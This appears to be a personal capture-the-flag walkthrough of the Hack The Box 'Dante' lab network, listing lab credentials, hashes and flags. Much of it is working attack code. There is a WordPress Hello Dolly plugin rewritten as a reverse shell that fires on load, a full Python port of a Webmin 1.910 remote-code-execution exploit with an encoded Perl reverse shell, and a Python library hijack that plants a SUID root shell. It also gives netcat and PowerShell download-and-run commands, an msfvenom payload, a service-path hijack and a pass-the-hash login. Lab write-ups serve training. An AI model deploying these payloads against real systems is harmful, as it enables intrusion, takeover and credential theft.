FLAG 3 DERITSO

SSH creds
```bash
ssh root@10.10.110.100 - root@Dante-web-nix01
ssh margaret@172.16.1.10 - margaret
ssh root@172.16.1.10 - root from frank
```

julian:$1$CrackMe$U93HdchOpEUP9iUxGVIvq/:18439:0:99999:7:::

```php
# Shell on wordpress Hello Dolly Plugin
<?php
/**
 * @package Hello_Dolly
 * @version 1.7.2
 */
/*
Plugin Name: Hello Dolly
Plugin URI: http://wordpress.org/plugins/hello-dolly/
Description: This is not just a plugin, it symbolizes the hope and enthusiasm of an entire generation summed up in two words sung most famously by Louis Armstrong: Hello, Dolly. When activated you will randomly see a lyric from <cite>Hello, Dolly</cite> in the upper right of your admin screen on every page.
Author: Matt Mullenweg
Version: 1.7.2
Author URI: http://ma.tt/
*/

// ────────────────────────────────────────────────
//          REVERSE SHELL PAYLOAD (executes on load)
// ────────────────────────────────────────────────
@error_reporting(0);
@set_time_limit(0);
ignore_user_abort(true);

// Reliable bash reverse shell (works on most HTB boxes)
$ip   = '10.10.14.17';   // ← CHANGE TO YOUR VPN IP
$port = '9001';          // ← YOUR LISTENER PORT

$shell = "bash -c 'bash -i >& /dev/tcp/{$ip}/{$port} 0>&1 &'";
exec($shell);

// Optional: fallback if exec is filtered (try these one by one)
# system($shell);
# passthru($shell);
# shell_exec($shell);
# popen($shell, 'r');

// Keep the original plugin somewhat functional so it doesn't crash hard
function hello_dolly_get_lyric() {
    return "Hello, pwned by Fern :)";
}

function hello_dolly() {
    $chosen = hello_dolly_get_lyric();
    echo '<p id="dolly"><span dir="ltr">' . $chosen . '</span></p>';
}

add_action('admin_notices', 'hello_dolly');

// Minimal CSS to not break admin too obviously
function dolly_css() {
    echo "<style>#dolly {float:right; padding:5px; font-size:12px;}</style>";
}
add_action('admin_head', 'dolly_css');
?>
```
# Show me the way
From James after a reverse shell cat `.bash_history` at `/home/james` then get the `mysql` credential `mysql -u balthazar -p TheJoker12345!` This is fucking useless

Escalate privilege by enumerating SUID with `find / -perm -4000 2>/dev.null`
By checking everything what worked was `/usr/bin/find` execute this exact command to escalate privilege in `/home/james`
```bash
find . -exec /bin/bash -p \; -quit
```
Then do `id` you will see you have `euid=0(root)` then list items in `/root` and get the flag
```bash
DANTE{Too_much_Pr1v!!!!}
```

PROXYING
At this point use ssh in case the connection gets cut out with the following commands
```bash
# Attacker
ssh-keygen -t ed25519 -C "dante-lab-rot" -f id_ed25519_dante
# Then just copy the id_ed25519_dante.pub using python server or any method

# Victim
mkdir -p /root/.ssh
chmod 700 /root/.ssh
# mv or echo your ssh-ed25519
echo "ssh-ed25519 [rest of id here] dante-lab-root" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# Then test from attacker
ssh -i ed_25519_dante root@<target ip>
```

Then bash ping internal IP for alive hosts
```bash
for i in {1..254}; do (ping -c 1 -W 1 172.16.1.$i | grep "bytes from" &); done | grep "bytes from" | cut -d " " -f 4 | tr -d ":"
```
This will lead to results of
```bash
   1   │ 172.16.1.5
   2   │ 172.16.1.10
   3   │ 172.16.1.13
   4   │ 172.16.1.12
   5   │ 172.16.1.17
   6   │ 172.16.1.19
   7   │ 172.16.1.20
   8   │ 172.16.1.100
   9   │ 172.16.1.101
  10   │ 172.16.1.102
```

Lateral movement by proxying this connection. Restart the SSH session with
```bash
ssh -i id_ed25519_dante root@<target ip> -D 1080
```

I use [ligolo](https://github.com/nicocha30/ligolo-ng) here this is the best solution. Pass the `agent` to the victim through python server or any file transfer method. Then do the following
```bash
# Make a tunnel either do:
> ifcreate --name <Interface_name>
# OR
> sudo ip tuntap add user [username] mode tun ligolo
> sudo ip link set ligolo up

# Start proxy I recommend you sudo
> sudo ./proxy -selfcert

# Then on victim, I recommend you chmod +x agent first
> ./agent -connect <attacker-ip>:11601 -ignore-cert

# Then go back to attacker and in ligolo do
> session # select victim's session
> autoroute # select the victim's session, use an existing tunnel, then select ligolo

# Verify by running ping or nmap
```
# An Open Goal
By scanning `172.16.1.5` there is an open ftp port where the flag is sitting. This is anonymous login
```bash
DANTE{Ther3s_M0r3_to_pwn_so_k33p_searching!}
```

# Seclusion is an Illusion
By scanning `172.16.1.10` we discover an open port of 80. Since we have a tunnel already we can visit the webpage.
If we explore more, we will notice a URL with the parameter `http://172.16.1.10/nav.php?page=` this is a clue for local file inclusion. We verify it with `nav.php?page=../../../../../etc/passwd`
It will reveal the `/etc/passwd` meaning it's successful. Then take note of the user that we got 
```bash
frank
margaret
```
If we check the SMB share of this IP, there is a null authentication vulnerability and if you get the file `admintasks.txt` you will know that it's a wordpress website
```txt
   1   │ -Remove wordpress install from web root - PENDING
   2   │ -Reinstate Slack integration on Ubuntu machine - PENDING
   3   │ -Remove old employee accounts - COMPLETE
   4   │ -Inform Margaret of the new changes - COMPLETE
   5   │ -Remove account restrictions on Margarets account post-promotion to admin - PENDING
```
The default location of a wordpress website installation is in `/var/www/html` and if we look back before we escalate our privilege from james, the configs are inside the `wordpress` directory. So we need to read the `wp-config.php` since it holds data. We can use the [PHP Wrappers](https://medium.com/@robsfromashes/php-wrapper-and-local-file-inclusion-2fb82c891f55) technique to read `.php` data.
```http
// You can use curl or burpsuite to do this

/nav.php?page=php://filter/read=convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php
```
Copy the base64 response and decode it with [Cyberchef](https://gchq.github.io/CyberChef/) you will get the following details

```php
// TRY THIS AS SSH ALSO :)

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME' 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'margaret' );

/** MySQL database password */
define( 'DB_PASSWORD', 'Welcome1!2@3#' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
```

Since we can't connect with `mysql` use the creds to login to `ssh` ```
```
ssh margaret@172.16.1.10
```
Once logged in it will tell you that you only have a limited actions on the shell. You can type `help` to know what commands are available. Then you'll see you can run `vim` we can escalate our privilege from this reference [GTFOBins Vim](https://gtfobins.org/gtfobins/vim/) 
```
> vim
> :set shell=/bin/bash|:shell
# This will not escalate your privilege but give you a shell that you can do commands with
```
Then get the flag in `/home/margaret`
```bash
DANTE{LF1_M@K3s_u5_lol}
```

From margaret, we need to pivot the user frank. If we check the `.config` directory there are various applications in it. We can check on directory Slack. One interesting directory is the `exported_data` we can inspect this directory and we'll find a file `user.json` and we'll see the users frank and margaret's account information in Slack.
```json
 {
        "id": "U013CT40QHM",
        "team_id": "T013LTDB554",
        "name": "htb_donotuse",
        "deleted": false,
        "color": "9f69e7",
        "real_name": "Frank",
        "tz": "America\/Los_Angeles",
        "tz_label": "Pacific Daylight Time",
        "tz_offset": -25200,
        "profile": {
            "title": "",
            "phone": "",
            "skype": "",
            "real_name": "Frank",
            "real_name_normalized": "Frank",
            "display_name": "",
            "display_name_normalized": "",
            "fields": null,
            "status_text": "",
            "status_emoji": "",
            "status_expiration": 0,
            "avatar_hash": "ga341d23f843",
            "email": "HTB_DONOTUSE@protonmail.com",
            "image_24": "https:\/\/secure.gravatar.com\/avatar\/a341d23f843e566bde18c04a566b47f3.jpg?s=24&d=https%3A%2F%2Fa.slack-edge.com%2Fdf10d%2Fimg%2Favatars%2Fava_0002-24.png",
            "image_32": "https:\/\/secure.gravatar.com\/avatar\/a341d23f843e566bde18c04a566b47f3.jpg?s=32&d=https%3A%2F%2Fa.slack-edge.com%2Fdf10d%2Fimg%2Favatars%2Fava_0002-32.png",
            "image_48": "https:\/\/secure.gravatar.com\/avatar\/a341d23f843e566bde18c04a566b47f3.jpg?s=48&d=https%3A%2F%2Fa.slack-edge.com%2Fdf10d%2Fimg%2Favatars%2Fava_0002-48.png",
            "image_72": "https:\/\/secure.gravatar.com\/avatar\/a341d23f843e566bde18c04a566b47f3.jpg?s=72&d=https%3A%2F%2Fa.slack-edge.com%2Fdf10d%2Fimg%2Favatars%2Fava_0002-72.png",
            "image_192": "https:\/\/secure.gravatar.com\/avatar\/a341d23f843e566bde18c04a566b47f3.jpg?s=192&d=https%3A%2F%2Fa.slack-edge.com%2Fdf10d%2Fimg%2Favatars%2Fava_0002-192.png",
            "image_512": "https:\/\/secure.gravatar.com\/avatar\/a341d23f843e566bde18c04a566b47f3.jpg?s=512&d=https%3A%2F%2Fa.slack-edge.com%2Fdf10d%2Fimg%2Favatars%2Fava_0002-512.png",
            "status_text_canonical": "",
            "team": "T013LTDB554"
        },
        "is_admin": true,
        "is_owner": true,
        "is_primary_owner": true,
        "is_restricted": false,
        "is_ultra_restricted": false,
        "is_bot": false,
        "is_app_user": false,
        "updated": 1589810238
    },
```
By diving deeper, we will find a file that has the conversations in Slack between frank and margaret. The summary of messages in `~/.config/Slack/exported_date/secure`
```
- **Frank** created the private channel and set its purpose to "discuss network security".
- **Frank** (1589794069): "Hi Margaret, I created the channel so we can discuss the network security - in private!"
- **Margaret** (1589794079): "Great idea, Frank"
- **Frank** (1589794187): "We need to migrate the Slack workspace to the new Ubuntu images, can you do this today?"
- **Margaret** (1589794206): "Sure, but I need my password for the Ubuntu images, I haven't been given it yet"
- **Frank** (1589794345): "Ahh sorry about that - its STARS5678FORTUNE401"
- **Margaret** (1589794355): "Thanks very much, I'll get on that now."
- **Frank** (1589794395): "No problem at all. I'll make this channel private from now on - we cant risk another breach"
- **Margaret** (1589795777): "Please get rid of my admin privs on the Ubuntu box and go ahead and make yourself an admin account"
- **Frank** (1589795785): "Thanks, will do"
- **Margaret** (1589806690): "I also set you a new password on the Ubuntu box - TractorHeadtorchDeskmat, same username"
```
We Found some creds: `frank:TractorHeadtorchDeskmat` we can use this creds to login as frank in the system.

Logged in as frank, we find a file `apache_restart.py`. Looking at `apache_restart.py` 
```python
import call
import urllib
url = urllib.urlopen(localhost)
page= url.getcode()
if page ==200:
	print ("We're all good!")
else:
	print("We're failing!")
	call(["systemctl start apache2"], shell=True)
```
it seems to run as a cron job. We will use [pspy](https://github.com/DominicBreuker/pspy/releases) to check for cron jobs running in the system.
```bash
2026/02/25 06:35:01 CMD: UID=0     PID=67491  | /bin/sh -c python3 /home/frank/apache_restart.py; sleep 1; rm /home/frank/call.py; sleep 1; rm /home/frank/urllib.py 
```
It seems to run the file `urllib.py` in `/home/frank` we can leverage this to escalate our privilege. By looking at its system path
```python
['', '/usr/lib/python38.zip', '/usr/lib/python3.8', '/usr/lib/python3.8/lib-dynload', '/usr/local/lib/python3.8/dist-packages', '/usr/lib/python3/dist-packages']
```
The `''` prioritize checking the current directory if running the script. We can leverage this to get a shell as root. Since in the cron job, the script is running as root from the `UID=0`.
```python
import os
os.system("cp /bin/sh /tmp/sh;chmod u+s /tmp/sh")
```
The script runs by telling the cron job that runs as root to copy the `/bin/sh` if the root copies it, it runs as root. Then it puts the `/bin/sh` at `/tmp/sh` then set SUID `chmod u+s` to run as file owner so that frank can run `/tmp/sh`. If we check on the `/tmp` directory or looking at the cron job, there will be a `/sh` directory in `/tmp` we can run it with `/tmp/sh -p` then verify our session with `id` and the `euid` will be 0 which means root. We can get the flag at `/root/flag.txt`
```txt
DANTE{L0v3_m3_S0m3_H1J4CK1NG_XD}
```

# Feeling Fintastic
Going to 172.16.1.17 The SMB share has a null auth, login then in forensics share get the `monitor` file. It is a pcap file for WireShark. Then open wireshark and use the pcap file. In the HTTP of `/session_login.cgi` there is a data there that reveals the credentials `admin:password6543`
Then when visiting its port 80. We notice that it's a webmin. There is an exploit available for this, since the exploit was python2, I converted it to python3 with.
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import urllib3
import argparse
import sys
import base64

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Simple colored output fallback (no termcolor dependency)
def colored(text, color):
    colors = {
        'blue': '\033[94m',
        'green': '\033[92m',
        'red': '\033[91m',
        'end': '\033[0m'
    }
    return f"{colors.get(color, '')}{text}{colors['end']}"

arg_parser = argparse.ArgumentParser(description='Webmin 1.910 - Remote Code Execution (Python 3 version)')
arg_parser.add_argument('--rhost', dest='rhost', help='IP address of the Webmin server', type=str, required=True)
arg_parser.add_argument('--rport', dest='rport', type=int, help='Target Webmin port (default: 10000)', default=10000)
arg_parser.add_argument('--lhost', dest='lhost', help='Local IP to listen for reverse shell', type=str, required=True)
arg_parser.add_argument('--lport', dest='lport', type=int, help='Bind port for reverse shell (default: 4444)', default=4444)
arg_parser.add_argument('-u', '--user', dest='user', help='Username for authentication (default: admin)', default='admin', type=str)
arg_parser.add_argument('-p', '--password', dest='password', help='Password for authentication', required=True, type=str)
arg_parser.add_argument('-t', '--targeturi', dest='targeturi', help='Base path for Webmin (default: /)', default='/', type=str)
arg_parser.add_argument('-s', '--ssl', dest='ssl', help='Use SSL/TLS (yes/true/t/y/1)', default='False', type=str.lower)

args = arg_parser.parse_args()

# Optional: proxy for Burp/ZAP testing
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

print(colored('****************************** Webmin 1.910 Exploit (Python 3) *******************************', 'blue'))
print(colored('*********************************************************************************************', 'blue'))
print(colored('****************************** Retrieve session cookie (sid) *********************************', 'blue'))

# Build login URL
if args.ssl in ('yes', 'true', 't', 'y', '1'):
    url = f"https://{args.rhost}:{args.rport}{args.targeturi}"
else:
    url = f"http://{args.rhost}:{args.rport}{args.targeturi}"

login_data = {'page': '', 'user': args.user, 'pass': args.password}

try:
    response = requests.post(
        f"{url}session_login.cgi",
        data=login_data,
        cookies={"testing": "1"},
        verify=False,
        allow_redirects=False,
        proxies=proxies,
        timeout=10
    )
except Exception as e:
    print(colored(f"[ERROR] Connection failed: {e}", 'red'))
    sys.exit(1)

# Check for SSL misconfig
if "This web server is running in SSL mode" in response.text:
    print(colored('********** [+] [ERROR] SSL is required - use --ssl yes', 'red'))
    sys.exit(1)

# Extract sid cookie
if 'Set-Cookie' in response.headers and 'sid' in response.headers['Set-Cookie']:
    sid_cookie = response.headers['Set-Cookie']
    sid = sid_cookie.split('sid=')[1].split(';')[0].strip()
    print(colored(f'********** [+] Session cookie (sid): {sid}', 'green'))
else:
    print(colored('********** [+] [ERROR] Authentication failed - check credentials', 'red'))
    sys.exit(1)

print(colored('*********************************************************************************************', 'blue'))
print(colored('****************************** Building payload & exploiting *********************************', 'blue'))
print("")

# Perl reverse shell payload (same as original)
perl_payload = (
    f"perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV)"
    f"{{if($ENV{{$key}}=~/(.*)/){{$ENV{{$key}}=$1;}}}}$c=new IO::Socket::INET"
    f"(PeerAddr,\"{args.lhost}:{args.lport}\");STDIN->fdopen($c,r);$~->fdopen($c,w);"
    f"while(<>){{if($_=~ /(.*)/){{system $1;}}}};'"
)

# Base64 encode the Perl payload
b64_encoded = base64.b64encode(perl_payload.encode('utf-8')).decode('utf-8').strip()

# Final command to decode and execute via bash
final_payload = f' | bash -c "{{echo,{b64_encoded}}}|{{base64,-d}}|{{bash,-i}}"'

print(colored(f"[+] Payload ready (base64 length: {len(b64_encoded)})", 'green'))

# Build the exploit request
exploit_data = {'u': ['acl/apt', final_payload]}
headers = {
    'Connection': 'close',
    'Referer': f"{url}package-updates/?xnavigation=1"
}

print(colored('Sending exploit request... (expect timeout if shell connects)', 'blue'))

try:
    exploit_response = requests.post(
        f"{url}package-updates/update.cgi",
        data=exploit_data,
        cookies={"sid": sid},
        verify=False,
        allow_redirects=False,
        headers=headers,
        proxies=proxies,
        timeout=10
    )
except requests.Timeout:
    print(colored(f"[+] Timeout - expected if reverse shell connected", 'green'))
except requests.ConnectionError as e:
    print(colored(f"[ERROR] Connection error: {e}", 'red'))
except Exception as e:
    print(colored(f"[ERROR] Unexpected: {e}", 'red'))

print("")
print(colored(f'********** [+] Exploit sent! Start your listener:', 'green'))
print(colored(f'    nc -lvnp {args.lport}', 'green'))
print(colored('    (wait a few seconds - shell should connect back)', 'green'))
```
Open a netcat listener, then run the script with `python3 webmin_exploit.py --rhost 172.16.1.17 --lhost <vpn ip> -u admin -p 'Password6543' --lport 9002` 
A connection will be made and you will be the user `root`. You can get the flag at `/root/flag.txt`
```txt
DANTE{SH4RKS_4R3_3V3RYWHERE}
```

# Let's take this discussion elsewhere
In the host `172.16.1.13` visit its webpage. The root page is nothing but a default XAMPP webserver. This tells us that the machine is a Windows. If we fuzz for directories, we will hit the endpoint `/discuss`. We find out that this web is vulnerable to [Online Discussion Forum Site](https://www.exploit-db.com/exploits/48512). Register an account, then on the browse page upload your `.php` shell. After successful upload, access it on `/discuss/ups/rev.php?cmd=whoami` it will tell you the user is gerald. Then navigate to `C:\Users\gerald\Desktop` to get the flag
```txt
DANTE{l355_t4lk_m04r_l15tening}
```

# Compare my numbers
In the same host `172.16.1.13` establish a reverse shell with [nc64.exe](https://github.com/int0x33/nc.exe/) then transfer it with python server and by using `curl` in the victim machine. The command will be `nc64.exe -e cmd.exe <attacker ip> <port>`. After some enumeration we find a file `Druva`, upon looking at the version in `licence.txt` it's 6.6.3 which is vulnerable to a privilege escalation [Druva inSync Windows Client](https://www.exploit-db.com/exploits/48505). Prepare a listener on attacker and execute the python script for druva privilege escalation by using the Python27 file at `C:\Python27\python.exe` with `c:\Python27\python.exe druvaPE.py "windows\system32\cmd.exe /C C:\xampp\htdocs\discuss\ups\nc64.exe <attacker ip> <port> -e cmd.exe"`. Then do a `whoami` command to verify it's SYSTEM then get the flag at `C:\Users\Administrator\Desktop`
```txt
DANTE{Bad_pr4ct1ces_Thru_strncmp}
```

# Again and again
At `172.16.1.12` navigate to its webpage, then select a single blog. It will return parameters `single.php?id=1` for example. We can inject an `SQLi` payload here, to check we put a single quote `'` then the response (using BurpSuite) will return an error in SQL syntax. We can use this vulnerability to automate our SQLi with `sqlmap` use `sqlmap` with `sqlmap -u "http://<target ip>/single.php?id=1" --batch --dbs`. Once successful dump the data in the `flag` db and `flag` table with `sqlmap "http://<target ip>/single.php?id=1" --batch -D flag -T flag --dump`. Then get the flag
```txt
DANTE{wHy_y0U_n0_s3cURe?!?!}
```

# Five Doctors
After getting the flag from "Again and again" go to the `blog_admin_db` and dump all the data from `membership_users` tables. There is an account `admin:admin` which you can login on the web but there's nothing much there. The user ben's password is crackable since the passwords are MD5 hashes. You can just use [crackstation](crackstation.net) to crack the passwords which leads to `ben:Welcometomyblog` then use this creds to SSH then get the flag
```txt
DANTE{Pretty_Horrific_PH4IL!}
```

# Minus + Minus = Plus?
As the user ben, when doing a `sudo -l` ben has the power to run `/bin/bash` as any user except root, with full root-like capabilities
```bash
Matching Defaults entries for ben on DANTE-NIX04:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User ben may run the following commands on DANTE-NIX04:
    (ALL, !root) /bin/bash
```
But... upon inspecting the `sudo` version of the system 
```bash
Sudo version 1.8.27
Sudoers policy plugin version 1.8.27
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.27
```
It is vulnerable to this privilege escalation [Sudo-1.8.27](https://github.com/0xGabe/Sudo-1.8.27) just do the following command
```
sudo -u#-1 /bin/bash
```
Then get the flag
```txt
DANTE{sudo_M4k3_me_@_Sandwich}
```

# Congratulation to a perfect pear
At `172.16.1.102` visit the website of the host, it is vulnerable to [OMRS - RCE](https://www.exploit-db.com/exploits/49557) download the script and transfer the `nc64.exe` so we can establish a reverse shell with
```python
python3 omrs.py -u http://172.16.1.102/ -m '230541868' -p 'dante123' -c 'powershell wget http://10.10.14.17:8000/nc64.exe -o nc64.exe'  

python3 omrs.py -u http://172.16.1.102/ -m '230541868' -p 'dante123' -c 'nc64.exe -e powershell 10.10.14.17 9003'
```
You will be logged in as blake, then navigate to `C:\Users\blake\Desktop` to get the flag
```txt
DANTE{U_M4y_Kiss_Th3_Br1d3}
```

`Admin:P@$$worD`

# MinatoTW strikes again
I don't know what happened here. But after you get the user blake from **Congratulation to a perfect pear**. The user has `SeImpersonatePrivilege` enabled, so a potato family exploit would be good here.
The potato I used is [Invoke-BadPotato.ps1](https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-BadPotato.ps1) then the `runme.bat` is just a execution bypass.
```powershell
@echo off
start /b powershell.exe -exec bypass -enc <base64_encoded_payload> 
exit /b
```

Transfer the `runme.bat` to the system, then the `BadPotato` will only be a download string so you can just run the file by using `Invoke-BadPotato -Command ""`
```powershell
(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.17:8000/runme.bat','c:\temp\runme.bat')
iex(new-object net.webclient).downloadstring('http://10.10.14.17:8000/Invoke-BadPotato.ps1')
```

Run `Invoke-BadPotato -Command ""` 
THEORY: The spooler will be exploited the moment you run the exploit. So what I did is that I made a meterpreter using msfvenom
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_kali_ip> LPORT=4444 -f exe -o payload.exe
```
Then open metasploit and used `multi/handler` then establish a shell, and you will be a SYSTEM already. Get the flag at `C:\Users\Administrator\Desktop\flag.txt`
```
DANTE{D0nt_M3ss_With_MinatoTW}
```


# That just blew my mind
At `172.16.1.101` run `nxc` tool for null auth enumeration. We can see that the machine is running **Windows Server 2012 R2 Standard** and an SMB share has SMBv1. This is vulnerable to `ms17_010_psexec`. Just run `msfconsole` and find that module. Set the RHOST to `172.16.1.101`. Once successful, get the flag at `C:\Users\katwamba\Desktop`
```
DANTE{Feel1ng_Blu3_or_Zer0_f33lings?}
```

# mrb3n leaves his mark
At `172.16.1.101` do the following command `net user` you will see there's a user "mrb3n". Now, do `net user mrb3n` and in the description you will find the flag.
```
DANTE{1_jusT_c@nt_st0p_d0ing_th1s}
```

# Update the policy
At `172.16.1.101` brute force the users that you got on `C:\Users\katwamba\Desktop` there is an xlsx file named `employee_backup.xlsx` gather the users and password there. Then, BruteForce it on the FTP port. 
Once the credentials for dharding is obtained. Get the file "Remote login.txt" there is a note saying:
```txt
Dido,

I've had to change your account password due to some security issues we have recently become aware of.

It's similar to your FTP password, but with a different number (ie. not 5!).

Come and see me in person to retrieve your password.

thanks, James

```
Then generate another password for dharding with
```bash
for i in {0..99}; do echo "WestminsterOrange$i"; done > dharding_pass.txt
```
Then login using `evil-winrm`. Then get the flag at Desktop
```
DANTE{superB4d_p4ssw0rd_FTW}
```

# Single or double quotes
At `172.16.1.101` as dharding it has the capability to start, stop, and configure IObit. We can exploit this with unquoted service path as an alternative. But looking with `sc.exe qc IObitUnSvr` we will change the binary of IObitUnSvr. Upload a netcat to your current directory then do:
```powershell
> sc.exe config IObitUnSvr binPath="cmd.exe /c C:\Users\dharding\Documents\nc64.exe -e cmd.exe 10.10.14.17 9003"
> sc.exe stop IObitUnSvr
> sc.exe start IObitUnSvr

# Make sure a listener is open
```
Then get the flag at `C:\Users\Administrator\Desktop`
```
DANTE{Qu0t3_I_4M_secure!_unQu0t3}
```

# It's getting hot in here
kerberoast user jbercov

```
DANTE{Im_too_hot_Im_K3rb3r045TinG!}
```

# One misconfig to rule them all
jbercov has getChangesAll to admin.dante dump the secret using secretsdump.py
```txt
DANTE{DC_or_Marvel?}
```

mysql -u ian -p VPN123ZXC

# We are going in circles
jenkins RCE, then su - ian, then debugfs
```
DANTE{g0tta_<3_ins3cur3_GROupz!}
```

# My cup runneth over


proxychains4 evil-winrm -i 172.16.2.5 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:4c827b7074e99eefd49d05872185f7f8:4c827b7074e99eefd49d05872185f7f8'
